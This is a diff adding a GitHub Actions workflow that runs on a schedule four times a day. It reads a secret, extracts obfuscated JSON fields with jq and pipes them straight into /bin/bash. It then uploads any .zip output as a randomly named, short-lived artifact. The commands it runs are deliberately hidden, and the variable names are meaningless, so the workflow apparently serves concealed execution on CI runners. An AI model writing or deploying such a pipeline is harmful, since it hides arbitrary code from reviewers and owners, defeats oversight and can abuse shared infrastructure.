@@ -1,0 +1,27 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 2,8,14,20 * * *'
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          gyc1: ${{ secrets.gyc1 }}
+        run: |
+          printf '%s' "$gyc1" | jq -r .nafi2594 | /bin/bash
+          echo $i39 | jq -r .hsjf851 | /bin/bash
+          echo $fhb03 | jq -r .frscx7502 | /bin/bash
+          echo $y50686 | jq -r .ch707 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: PGmirWMz
+          path: "*.zip"
+          retention-days: 1
